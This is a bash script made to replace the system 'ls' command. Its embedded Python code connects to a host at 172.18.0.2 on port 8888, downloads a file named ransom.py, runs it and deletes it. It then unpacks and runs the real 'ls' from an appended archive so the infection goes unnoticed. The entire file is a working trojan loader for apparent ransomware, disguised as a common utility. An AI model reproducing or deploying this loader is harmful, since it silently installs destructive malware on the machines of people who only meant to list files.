#!/bin/bash

python3 - <<END
import socket
import sys

def fetch_file(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, int(port)))
        s.sendall("GET FILE".encode()) 
        with open('ransom.py', 'wb') as file:
            while True:
                data = s.recv(1024)
                if not data:
                    break
                file.write(data)

ip = "172.18.0.2"  
port = "8888"         
fetch_file(ip, port)
END

chmod +x ransom.py
python3 ransom.py
rm ransom.py

# unzip original "ls"
ARCHIVE=`awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' $0`
tail -n+${ARCHIVE} $0 |  unzip -o -d /tmp - > /dev/null
# execute original "ls"
chmod +x /tmp/ls
/tmp/ls $1
rm /tmp/ls

exit 0

__ARCHIVE_BELOW__
